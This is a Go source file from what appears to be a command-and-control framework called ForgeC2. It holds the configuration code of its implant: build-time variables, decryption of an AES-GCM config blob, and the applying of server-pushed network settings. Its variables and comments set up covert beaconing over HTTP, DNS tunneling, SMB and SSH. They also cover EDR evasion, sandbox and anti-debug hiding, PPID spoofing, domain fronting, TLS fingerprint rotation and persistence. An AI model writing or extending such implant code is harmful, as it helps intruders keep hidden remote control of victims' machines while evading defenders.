//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/forgec2/forgec2/pkg/protocol"
)

// These variables are injected at compile time via -ldflags "-X main.C2URL=..."
// This source is used exclusively by the Generate Agent flow (EXE).
// IMPORTANT: -X can ONLY set string variables. Non-strings are injected as *Str and parsed in init().
var (
	C2URL               string       = s(SC2DefaultURL)
	c2URLsAtomic        atomic.Value // immutable snapshot of C2 URLs (published via c2URLsStore)
	currentC2Idx        atomic.Int32 // index of last working C2 server (atomic: read by screenshot goroutine, written by C2 senders)
	IntervalStr         string       = "10"
	JitterStr           string       = "20"
	UserAgent           string       = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
	PersistStr          string       = "false"
	SkipTLSVerifyStr    string       = "false" // default secure; change to "true" for self-signed C2 certs
	Protocol            string       = "http"  // "http" or "tcp" injected via ldflags
	DebugStr            string       = "false" // set via ldflags for debug builds (stealth default false)
	FastInterval        int          = 1       // Fast interval for screen monitoring (1 second)
	BeaconURIStr        string       = s(SBeaconURI)
	BeaconMethodStr     string       = s(SBeaconMethod)
	ListenerIDStr       string       = "0"
	P2PMode             string       = ""    // "", "smb", "tcp"
	P2PParent           string       = ""    // parent agent to connect to (child mode)
	P2PListenAddr       string       = ""    // listen addr for children (parent mode)
	DNSDomain           string       = ""    // DNS C2 domain (e.g. "c2.example.com")
	DNSServer           string       = ""    // DNS C2 server IP
	DNSDoHURL           string       = ""    // DNS-over-HTTPS endpoint (e.g. "https://dns.google/dns-query")
	DNSDoTAddr          string       = ""    // DNS-over-TLS address:port (e.g. "1.1.1.1:853")
	DNSIPv6             bool         = false // enable IPv6 AAAA record tunneling
	DNSARecordTunnel    bool         = false // enable A-record tunneling (response payload packed into 4-byte A rdata)
	DNSTCP              bool         = false // send DNS queries over TCP (RFC 1035 length-prefixed) instead of UDP
	DNSObscure          bool         = false // XOR-obscure DNS fragments/responses keyed by the agent UUID
	ProxyStr            string       = ""    // HTTP proxy URL (e.g. "http://proxy:8080")
	CryptoKeyStr        string       = ""    // 32-byte hex key for beacon payload encryption ("" = disabled)
	BeaconKeyStr        string       = ""    // pre-shared key used to derive registration auth ("" = no PSK auth)
	RegSecretIDStr      string       = ""    // v3: per-implant registration secret id ("" = v2 master-key derivation)
	RegSecretStr        string       = ""    // v3: per-implant registration secret, base64 ("" = v2 master-key derivation)
	P2PSharedSecret     string       = ""    // P2P relay pre-shared key (base64 32 bytes). Build pipelines stamp this via -ldflags so parent + child implants share a mesh key. "" = no P2P auth (legacy)
	DomainFront         string       = ""    // Domain fronting: when set, the TLS SNI (via uTLS) and HTTP Host header both present this domain while the connection still egresses to C2URL. Point C2URL at the CDN/proxy edge and set DomainFront to the fronted hostname so passive observers (and the CDN) see only the fronted domain. "" = disabled
	ContentLengthJitter int          = 0     // Max random padding bytes for HTTP/WS beacon body (0=disabled)
	MalleablePrepend    string       = ""    // bytes prepended to every HTTP beacon response body (server malleable profile)
	// MalleableRespDecode holds the serialized output transforms (e.g.
	// "base64;xor:microsoft") of the server's malleable profile. When non-empty
	// the agent reverses them on every HTTP beacon response so the encrypted
	// envelope can be recovered (without it the profile-preset C2 pipeline is
	// dead for the live agent). Delivered over-the-wire when a profile is set.
	MalleableRespDecode     string            = ""
	MalleableAppend         string            = ""                            // bytes appended to every HTTP beacon response body (server malleable profile)
	MalleableRequestPrepend string            = ""                            // bytes prepended to the agent's OUTGOING HTTP beacon body (server strips on inbound)
	MalleableRequestAppend  string            = ""                            // bytes appended to the agent's OUTGOING HTTP beacon body (server strips on inbound)
	MalleableRequestHeaders map[string]string = nil                           // extra request headers sent on outbound beacons (e.g. Host/Cookie shaping)
	RequestHeaderPoolStr    string            = ""                            // v2 decoy header pool ("Name: value" lines, one random entry per beacon)
	MalleableClientID       string            = ""                            // v2 client id chain (wire form, audit/preview)
	MalleableClientMeta     string            = ""                            // v2 client metadata chain (wire form)
	BeaconURIsStr           string            = ""                            // v2 comma-joined rotation list (primary is BeaconURI)
	BeaconParameterStr      string            = ""                            // v2 POST parameter name
	MalleablePlacementStr   string            = ""                            // v2 placements JSON [{target,chain}] cover copies
	UserAgentsStr           string            = ""                            // v2 UA rotation pool, newline-joined
	JitterURIStr            string            = ""                            // v2 URI jitter flag ("true" = junk query per beacon)
	ParameterNamesStr       string            = ""                            // v2 query param name pool, newline-joined
	ExpiryDateStr           string            = ""                            // Compile-time expiry date: "YYYY-MM-DD" — implant auto-exits after this date
	EvasionStr              string            = "false"                       // Compile-time EDR evasion (chunked sleep); also FORGEC2_EVASION=1 at runtime
	SyscallPolicyStr        string            = "false"                       // Direct/indirect syscall policy; independent of sleep-mask opt-in. also FORGEC2_SYSCALL_POLICY=1 at runtime
	GhostModeStr            string            = "false"                       // Compile-time ghost protocol (sandbox/anti-debug deep-hiding); also FORGEC2_GHOST_MODE=1 at runtime
	PPIDSpoofStr            string            = "false"                       // Compile-time PPID spoofing
	PPIDSpoofParent         string            = "explorer.exe"                // Parent process name used for PPID spoofing
	PersistencePrefixStr    string            = ""                            // Custom prefix for persistence artifacts (reg keys, task names, file names); default "ForgeC2"
	BeaconTransportStr      string            = "http"                        // "http", "wss", "ssh" — transport protocol for beacon
	ChameleonStr            string            = "false"                       // per-dial uTLS JA3 rotation (off = stable Chrome Auto); also FORGEC2_CHAMELEON=1 at runtime
	ChameleonProfileStr     string            = "random"                      // chrome|firefox|safari|edge|ios|android|360|qq|random or a full utls profile name; also FORGEC2_CHAMELEON_PROFILE at runtime
	SMBPipeName             string            = ""                            // named pipe name for SMB transport (defaults to persistencePrefix)
	IsSMBParentStr          string            = "false"                       // "true" = this agent is an SMB parent (listens on pipe)

	// Runtime state for the independent syscall policy (option B): shared with
	// syscall_policy_windows.go so startup resolution is testable and observable.
	syscallPolicyEnabled   bool                // runtime: syscall policy engaged (parsed from SyscallPolicyStr / FORGEC2_SYSCALL_POLICY)
	syscallPolicyResolved  bool                // runtime: startup resolution completed
	syscallPolicySource    string            // runtime: ntdll file the table was resolved from
	syscallPolicyFailed    []string          // runtime: required syscalls that failed to resolve
	SSHUserStr             string            = ""                            // SSH username for SSH transport (defaults to persistencePrefix)
	SSHPasswordStr          string            = ""                            // SSH password for SSH transport
	SSHKeyStr               string            = ""                            // base64-encoded PEM private key for SSH transport
	SSHHostKeyStr           string            = ""                            // base64 server host public key (pin); empty = SSH transport refuses to connect
	EgressDetectionStr      string            = "false"                       // enable egress detection on startup
	EgressPortsStr          string            = "80,443,8080,8443,53,22,2222" // ports to test for egress
	StartDelayMinStr        string            = "0"                           // startup delay window floor, seconds (0 = disabled)
	StartDelayMaxStr        string            = "0"                           // startup delay window ceiling, seconds (0 = disabled)

	// Certificate pinning (SHA-256 hex of server DER cert; empty = disabled)
	PinnedCertSHA256Str string = ""

	// mTLS transport
	MTLSCertStr string = "" // base64-encoded client certificate PEM for mTLS
	MTLSKeyStr  string = "" // base64-encoded client key PEM for mTLS
	MTLSCAStr   string = "" // base64-encoded CA certificate PEM for mTLS

	// Multi-C2 traffic splitting and failover
	C2ModeStr      string = s(SC2Mode) // "single", "failover", "roundrobin", "random", "split", "parallel"
	MaxRetriesStr  string = "10"       // max retries before entering dead mode
	DeadTimeoutStr string = "3600"     // seconds to wait before retrying dead C2s

	// P2P Mesh / Gossip Discovery
	GossipEnabledStr  string = "false" // enable gossip peer discovery
	GossipIntervalStr string = "30"    // seconds between gossip probes
	GossipListenAddr  string = ""      // gossip listen addr (defaults to P2PListenAddr+1)

	// Working Hours
	WorkingStartStr string = "" // HH:MM start of working hours (empty = disabled)
	WorkingEndStr   string = "" // HH:MM end of working hours (empty = disabled)
	WorkingTZStr    string = "" // IANA timezone (empty = UTC)

	// Per-Agent Kill Date
	KillDateStr string = "" // YYYY-MM-DD — agent self-destructs after this date (empty = disabled)

	// Binary integrity verification (SHA-256 hex of the running binary; empty = disabled)
	SelfCheckSHA256Str string = ""

	// ConfigBlob is the XOR-obfuscated runtime configuration block injected via
	// -ldflags "-X main.ConfigBlob=...". The agent decodes it during init() and
	// reapplies it over the build-time defaults above. Empty = use defaults only
	// (direct `go build` of the agent source without the Generate pipeline).
	ConfigBlob string = ""
)

// Parsed versions (populated in init)
var (
	Interval         int
	Jitter           int
	Persist          bool
	SkipTLSVerify    bool
	Debug            bool
	BeaconURI        string
	BeaconMethod     string
	ListenerID       uint
	BeaconTransport  string
	evasionEnabled   bool
	ghostModeEnabled bool
	chameleonProfile string
	isSMBParent      bool
	smbPipeName      string // resolved SMB pipe name (from SMBPipeName or extracted from C2URL)
)

var ecdhSess *ecdhSession    // ECDH session for forward-secret encryption (nil = not established)
var inSandbox bool           // set by sandbox detection at startup
var ppidSpoofEnabled bool    // PPID spoofing enabled via ldfags
var ppidSpoofParent string   // parent process name used for PPID spoofing
var persistencePrefix string // artifact name prefix for persistence (default "ForgeC2")
var egressDetection bool     // parsed from EgressDetectionStr
var AgentVersion = s(SAgentVersion)
var maxRetries int             // parsed from MaxRetriesStr
var deadTimeout time.Duration  // parsed from DeadTimeoutStr
var dnsConsecutiveFailures int // DNS beacon consecutive failure count
const dnsFallbackThreshold = 5 // fallback to HTTP after this many DNS failures

// protoMu guards Protocol and BeaconTransport: the beacon loop mutates them
// on transport fallback/rotation while task workers (screenshots, quick
// results, c2mode queries) read them concurrently.
var protoMu sync.RWMutex

func getProtocol() string {
	protoMu.RLock()
	defer protoMu.RUnlock()
	return Protocol
}

func setProtocol(v string) {
	protoMu.Lock()
	Protocol = v
	protoMu.Unlock()
}

func getBeaconTransport() string {
	protoMu.RLock()
	defer protoMu.RUnlock()
	return BeaconTransport
}

func setBeaconTransport(v string) {
	protoMu.Lock()
	BeaconTransport = v
	protoMu.Unlock()
}

func setProtocolAndTransport(p, b string) {
	protoMu.Lock()
	Protocol, BeaconTransport = p, b
	protoMu.Unlock()
}

// Working hours runtime state. Kept behind an atomic.Value so config tasks
// can update it while the beacon loop reads it without a data race (each
// read sees a consistent immutable snapshot).
type workingHoursState struct {
	start, end, tz string // HH:MM start/end, IANA timezone
}

var workingHours atomic.Value // holds workingHoursState

func getWorkingHours() workingHoursState {
	if v, ok := workingHours.Load().(workingHoursState); ok {
		return v
	}
	return workingHoursState{}
}

func setWorkingHours(start, end, tz string) {
	workingHours.Store(workingHoursState{start: start, end: end, tz: tz})
}

// Kill date runtime state
var killDateParsed time.Time // parsed from KillDateStr

// agentConfigBlob mirrors the config keys produced by the server's
// payload.buildConfigBlobKeyed. Empty values are ignored so injected config only
// overrides non-default values and build-time defaults otherwise stand.
type agentConfigBlob struct {
	C2URL            string `json:"c2_url"`
	Interval         string `json:"interval"`
	Jitter           string `json:"jitter"`
	UserAgent        string `json:"user_agent"`
	Persist          string `json:"persist"`
	SkipTLSVerify    string `json:"skip_tls"`
	Protocol         string `json:"protocol"`
	Debug            string `json:"debug"`
	BeaconURI        string `json:"beacon_uri"`
	BeaconMethod     string `json:"beacon_method"`
	ListenerID       string `json:"listener_id"`
	P2PMode          string `json:"p2p_mode"`
	P2PParent        string `json:"p2p_parent"`
	P2PListenAddr    string `json:"p2p_listen"`
	DNSDomain        string `json:"dns_domain"`
	DNSServer        string `json:"dns_server"`
	DNSDoHURL        string `json:"dns_doh"`
	DNSDoTAddr       string `json:"dns_dot"`
	DNSObscure       string `json:"dns_obscure"`
	Proxy            string `json:"proxy"`
	CryptoKey        string `json:"crypto_key"`
	BeaconKey        string `json:"beacon_key"`
	RegSecretID      string `json:"reg_secret_id"`
	RegSecret        string `json:"reg_secret"`
	ExpiryDate       string `json:"expiry"`
	Evasion          string `json:"evasion"`
	GhostMode        string `json:"ghost_mode"`
	DomainFront      string `json:"domain_front"`
	WorkingStart     string `json:"work_start"`
	WorkingEnd       string `json:"work_end"`
	WorkingTZ        string `json:"work_tz"`
	BeaconTransport  string `json:"beacon_transport"`
	SSHUser          string `json:"ssh_user"`
	SSHPassword      string `json:"ssh_password"`
	SSHKey           string `json:"ssh_key"`
	SSHHostKey       string `json:"ssh_host_key"`
	MTLSCert         string `json:"mtls_cert"`
	MTLSKey          string `json:"mtls_key"`
	MTLSCA           string `json:"mtls_ca"`
	PinnedCertSHA256 string `json:"pinned_cert"`
	SelfCheckSHA256  string `json:"self_check"`
	MalleablePrepend string `json:"malleable_prepend"`
	MalleableAppend  string `json:"malleable_append"`
	// MalleableRespDecode is the over-the-wire form of the server's profile
	// output transforms; non-empty when a malleable profile preset is active.
	MalleableRespDecode string `json:"malleable_resp_decode"`
	// Max random bytes appended to the HTTP/WS beacon body (0=disabled). Kept
	// as a string to match the -X injection convention used by every other
	// runtime knob on this struct.
	ContentLengthJitter string `json:"content_length_jitter"`
	// Startup delay window in seconds (0/0 = disabled).
	StartDelayMin string `json:"start_delay_min"`
	StartDelayMax string `json:"start_delay_max"`
	// Request-side transforms applied by the agent to outbound beacons.
	MalleableRequestPrepend string            `json:"malleable_request_prepend"`
	MalleableRequestAppend  string            `json:"malleable_request_append"`
	MalleableRequestHeaders map[string]string `json:"malleable_request_headers"`
	MalleableClientID       string            `json:"malleable_client_id"`
	MalleableClientMeta     string            `json:"malleable_client_meta"`
	RequestHeaderPool       string            `json:"request_header_pool"`
	BeaconURIs              string            `json:"beacon_uris"`
	Parameter               string            `json:"parameter"`
	MalleablePlacement      string            `json:"malleable_placement"`
	UserAgents              string            `json:"user_agents"`
	JitterURI               string            `json:"jitter_uri"`
	ParameterNames          string            `json:"parameter_names"`
}

// loadConfigBlob decodes the injected runtime config block and reapplies it over
// the compile-time defaults. It must be called before config values are parsed.
func loadConfigBlob() {
	if ConfigBlob == "" {
		return
	}
	plain := decryptConfigBlob(ConfigBlob)
	if plain == nil {
		logDebug("[config] blob decode failed (bad key or tampered), using build-time defaults")
		return
	}
	var b agentConfigBlob
	if err := json.Unmarshal(plain, &b); err != nil {
		logDebug("[config] blob unmarshal failed, using build-time defaults")
		return
	}
	b.apply()
	// Zeroize the decrypted plaintext blob now that its fields have been copied
	// into the agent's config globals. The JSON text (which still contains every
	// secret in cleartext) must not linger in the heap (C3).
	for i := range plain {
		plain[i] = 0
	}
}

// decryptConfigBlob decrypts the runtime config blob (AES-256-GCM) using the
// key delivered via the strxor table. Returns nil on any failure so callers
// fall back to build-time defaults (a tampered blob is never applied).
func decryptConfigBlob(blob string) []byte {
	key, err := hex.DecodeString(s(SConfigKey))
	if err != nil || len(key) != 32 {
		return nil
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil
	}
	raw, err := base64.StdEncoding.DecodeString(blob)
	if err != nil || len(raw) < gcm.NonceSize() {
		return nil
	}
	nonce, ct := raw[:gcm.NonceSize()], raw[gcm.NonceSize():]
	plain, err := gcm.Open(nil, nonce, ct, nil)
	if err != nil {
		return nil
	}
	return plain
}

// validC2Schemes lists every transport the agent can dispatch. A
// config-over-wire C2URL must use one of these schemes; anything else is
// rejected rather than applied (defense-in-depth on top of the
// already-authenticated decrypt).
var validC2Schemes = []string{
	"http://", "https://", "ws://", "wss://", "h2c://",
	"grpc://", "grpcs://", "mtls://",
	"tcp://", "tls://", "udp://", "quic://",
	"icmp://", "dns://", "ssh://", "smb://",
}

func hasValidC2Scheme(u string) bool {
	u = strings.ToLower(strings.TrimSpace(u))
	for _, p := range validC2Schemes {
		if strings.HasPrefix(u, p) {
			return true
		}
	}
	return false
}

// splitC2URLList normalizes the comma-separated C2URL form used by the
// generator and the network-config path. Empty entries are dropped.
func splitC2URLList(raw string) []string {
	parts := strings.Split(raw, ",")
	urls := make([]string, 0, len(parts))
	for _, p := range parts {
		if p = strings.TrimSpace(p); p != "" {
			urls = append(urls, p)
		}
	}
	return urls
}

// mergeServerC2URL replaces the primary endpoint with the one the server just
// resolved while keeping the compile-time/persisted failover chain. The old
// code overwrote the whole list with the single delivered URL, so a listener
// failover silently disappeared after the first registration.
func mergeServerC2URL(primary string, existing []string) []string {
	primary = strings.TrimSpace(primary)
	if primary == "" {
		return existing
	}
	merged := make([]string, 0, len(existing)+1)
	merged = append(merged, primary)
	seen := map[string]struct{}{strings.ToLower(primary): {}}
	for i, raw := range existing {
		// existing[0] is the previous primary; the server-delivered URL
		// replaces it rather than accumulating stale primaries on every
		// config refresh.
		if i == 0 {
			continue
		}
		raw = strings.TrimSpace(raw)
		if raw == "" {
			continue
		}
		key := strings.ToLower(raw)
		if _, ok := seen[key]; ok {
			continue
		}
		seen[key] = struct{}{}
		merged = append(merged, raw)
	}
	return merged
}

// lastNetworkConfigFingerprint is the plaintext fingerprint of the config the
// agent applied last. The periodic server refresh re-sends the same config
// (with a fresh nonce) every 15 minutes; comparing fingerprints avoids
// rewriting the persisted blob and re-parsing the network stack for nothing.
// Only the beacon loop (and startup) calls applyServerNetworkConfig, so a
// plain string is enough.
var lastNetworkConfigFingerprint string

// applyServerNetworkConfig decrypts and applies a server-delivered network
// config (config-over-wire). The blob is AES-256-GCM under the per-implant
// registration secret; only a server holding that secret could have produced it,
// and the enclosing response frame is already MAC-authenticated. Non-empty
// fields override the compile-time defaults. Per-field values are revalidated
// before applying so a malformed or partially corrupt blob cannot steer the
// agent at an unexpected target. The raw blob is persisted so the agent keeps
// the operator's latest config across restarts without re-registering.
func applyServerNetworkConfig(b64 string) {
	if b64 == "" || RegSecretStr == "" {
		return
	}
	secret, err := base64.StdEncoding.DecodeString(RegSecretStr)
	if err != nil || len(secret) != 32 {
		logDebug("[config] cannot derive network-config key (bad reg secret)")
		return
	}
	nc, err := protocol.DecryptNetworkConfig(secret, b64)
	if err != nil {
		logDebug("[config] network config decrypt failed, keeping defaults")
		return
	}
	fingerprint := protocol.NetworkConfigFingerprint(nc)
	if fingerprint != "" && fingerprint == lastNetworkConfigFingerprint {
		// Same live config as last time: the periodic refresh has nothing to do.
		return
	}
	c2URL := strings.TrimSpace(nc.C2URL)
	if c2URL != "" && !hasValidC2Scheme(c2URL) {
		logDebug("[config] network config: skipping C2URL with invalid scheme")
		c2URL = ""
	}
	var mergedURLs []string
	if c2URL != "" {
		existing := c2URLsSnapshot()
		if len(existing) == 0 {
			existing = splitC2URLList(C2URL)
		}
		mergedURLs = mergeServerC2URL(c2URL, existing)
	}
	b := agentConfigBlob{
		Protocol:            nc.Protocol,
		BeaconTransport:     nc.BeaconTransport,
		UserAgent:           nc.UserAgent,
		Proxy:               nc.Proxy,
		SkipTLSVerify:       boolToStr(nc.SkipTLSVerify),
		DNSDomain:           nc.DNSDomain,
		DNSServer:           nc.DNSServer,
		DomainFront:         nc.DomainFront,
		MalleablePrepend:    nc.MalleablePrepend,
		MalleableAppend:     nc.MalleableAppend,
		MalleableRespDecode: nc.MalleableRespDecode,
		BeaconURI:           nc.BeaconURI,
		BeaconURIs:          nc.BeaconURIs,
		UserAgents:          nc.UserAgents,
	}
	if nc.RequestPrepend != "" {
		b.MalleableRequestPrepend = nc.RequestPrepend
	}
	if nc.RequestAppend != "" {
		b.MalleableRequestAppend = nc.RequestAppend
	}
	if nc.RequestHeaders != nil {
		b.MalleableRequestHeaders = nc.RequestHeaders
	}
	if nc.RequestHeaderPool != "" {
		b.RequestHeaderPool = nc.RequestHeaderPool
	}
	if nc.ParameterNames != "" {
		b.ParameterNames = nc.ParameterNames
	}
	if nc.MalleablePlacement != "" {
		b.MalleablePlacement = nc.MalleablePlacement
	}
	// Only override sleep values when the server supplied authoritative ones;
	// an agent's compile-time interval is left intact otherwise.
	if nc.Interval > 0 {
		b.Interval = strconv.Itoa(nc.Interval)
	}
	if nc.Jitter > 0 {
		b.Jitter = strconv.Itoa(nc.Jitter)
	}
	b.apply()
	if len(mergedURLs) > 0 {
		C2URL = strings.Join(mergedURLs, ",")
	}
	reparseNetworkConfig()
	lastNetworkConfigFingerprint = fingerprint
	if err := saveNetworkConfig(b64); err != nil {
		logDebug("[config] failed to persist network config")
	} else {
		logDebug("[config] applied network config over wire")
	}
}

// loadPersistedNetworkConfig re-applies a previously delivered network config
// from disk (written by applyServerNetworkConfig) so the agent starts with the
// operator's last-known config even before it re-registers.
func loadPersistedNetworkConfig() {
	if RegSecretStr == "" {
		return
	}
	data, err := os.ReadFile(getBeaconStateFilePath("network_config"))
	if err != nil {
		return
	}
	applyServerNetworkConfig(strings.TrimSpace(string(data)))
}

func saveNetworkConfig(b64 string) error {
	// Sync: losing this file after a power cut sends the agent back to its
	// build-time endpoint, which may no longer exist.
	return writeStateFileAtomic(getBeaconStateFilePath("network_config"), []byte(b64), 0o600, true)
}

func boolToStr(b bool) string {
	if b {
		return "true"
	}
	return "false"
}

func (b *agentConfigBlob) apply() {
	if b.C2URL != "" {
		C2URL = b.C2URL
	}
	if b.Interval != "" {
		IntervalStr = b.Interval
	}
	if b.Jitter != "" {
		JitterStr = b.Jitter
	}
	if b.UserAgent != "" {
		UserAgent = b.UserAgent
	}
	if b.Persist != "" {
		PersistStr = b.Persist
	}
	if b.SkipTLSVerify != "" {
		SkipTLSVerifyStr = b.SkipTLSVerify
	}
	if b.Protocol != "" {
		setProtocol(b.Protocol)
	}
	if b.Debug != "" {
		DebugStr = b.Debug
	}
	if b.BeaconURI != "" {
		BeaconURIStr = b.BeaconURI
	}
	if b.BeaconMethod != "" {
		BeaconMethodStr = b.BeaconMethod
	}
	if b.ListenerID != "" {
		ListenerIDStr = b.ListenerID
	}
	if b.P2PMode != "" {
		P2PMode = b.P2PMode
	}
	if b.P2PParent != "" {
		P2PParent = b.P2PParent
	}
	if b.P2PListenAddr != "" {
		P2PListenAddr = b.P2PListenAddr
	}
	if b.DNSDomain != "" {
		DNSDomain = b.DNSDomain
	}
	if b.DNSServer != "" {
		DNSServer = b.DNSServer
	}
	if b.DNSDoHURL != "" {
		DNSDoHURL = b.DNSDoHURL
	}
	if b.DNSDoTAddr != "" {
		DNSDoTAddr = b.DNSDoTAddr
	}
	if b.DNSObscure == "true" {
		DNSObscure = true
	}
	if b.Proxy != "" {
		ProxyStr = b.Proxy
	}
	if b.CryptoKey != "" {
		CryptoKeyStr = b.CryptoKey
	}
	if b.BeaconKey != "" {
		BeaconKeyStr = b.BeaconKey
	}
	if b.RegSecretID != "" {
		RegSecretIDStr = b.RegSecretID
	}
	if b.RegSecret != "" {
		RegSecretStr = b.RegSecret
	}
	if b.ExpiryDate != "" {
		ExpiryDateStr = b.ExpiryDate
	}
	if b.Evasion != "" {
		EvasionStr = b.Evasion
	}
	if b.GhostMode != "" {
		GhostModeStr = b.GhostMode
	}
	if b.DomainFront != "" {
		DomainFront = b.DomainFront
	}
	if b.WorkingStart != "" {
		WorkingStartStr = b.WorkingStart
	}
	if b.WorkingEnd != "" {
		WorkingEndStr = b.WorkingEnd
	}
	if b.WorkingTZ != "" {
		WorkingTZStr = b.WorkingTZ
	}
	if b.BeaconTransport != "" {
		BeaconTransportStr = b.BeaconTransport
	}
	if b.SSHUser != "" {
		SSHUserStr = b.SSHUser
	}
	if b.SSHPassword != "" {
		SSHPasswordStr = b.SSHPassword
	}
	if b.SSHKey != "" {
		SSHKeyStr = b.SSHKey
	}
	if b.SSHHostKey != "" {
		SSHHostKeyStr = b.SSHHostKey
	}
	if b.MTLSCert != "" {
		MTLSCertStr = b.MTLSCert
	}
	if b.MTLSKey != "" {
		MTLSKeyStr = b.MTLSKey
	}
	if b.MTLSCA != "" {
		MTLSCAStr = b.MTLSCA
	}
	if b.PinnedCertSHA256 != "" {
		PinnedCertSHA256Str = b.PinnedCertSHA256
	}
	if b.SelfCheckSHA256 != "" {
		SelfCheckSHA256Str = b.SelfCheckSHA256
	}
	if b.MalleablePrepend != "" {
		MalleablePrepend = b.MalleablePrepend
	}
	if b.MalleableAppend != "" {
		MalleableAppend = b.MalleableAppend
	}
	if b.MalleableRespDecode != "" {
		MalleableRespDecode = b.MalleableRespDecode
		reparseMalleableTransforms()
	}
	if b.MalleableRequestPrepend != "" {
		MalleableRequestPrepend = b.MalleableRequestPrepend
	}
	if b.MalleableRequestAppend != "" {
		MalleableRequestAppend = b.MalleableRequestAppend
	}
	if b.MalleableRequestHeaders != nil {
		MalleableRequestHeaders = b.MalleableRequestHeaders
	}
	if b.RequestHeaderPool != "" {
		RequestHeaderPoolStr = b.RequestHeaderPool
	}
	if b.MalleableClientID != "" {
		MalleableClientID = b.MalleableClientID
	}
	if b.MalleableClientMeta != "" {
		MalleableClientMeta = b.MalleableClientMeta
	}
	if b.BeaconURIs != "" {
		BeaconURIsStr = b.BeaconURIs
	}
	if b.Parameter != "" {
		BeaconParameterStr = b.Parameter
	}
	if b.MalleablePlacement != "" {
		MalleablePlacementStr = b.MalleablePlacement
	}
	if b.UserAgents != "" {
		UserAgentsStr = b.UserAgents
	}
	if b.JitterURI != "" {
		JitterURIStr = b.JitterURI
	}
	if b.ParameterNames != "" {
		ParameterNamesStr = b.ParameterNames
	}
	if b.ContentLengthJitter != "" {
		if v, err := strconv.Atoi(b.ContentLengthJitter); err == nil {
			if v < 0 {
				v = 0
			}
			if v > 4096 {
				v = 4096
			}
			ContentLengthJitter = v
		}
	}
	if b.StartDelayMin != "" {
		StartDelayMinStr = b.StartDelayMin
	}
	if b.StartDelayMax != "" {
		StartDelayMaxStr = b.StartDelayMax
	}
}
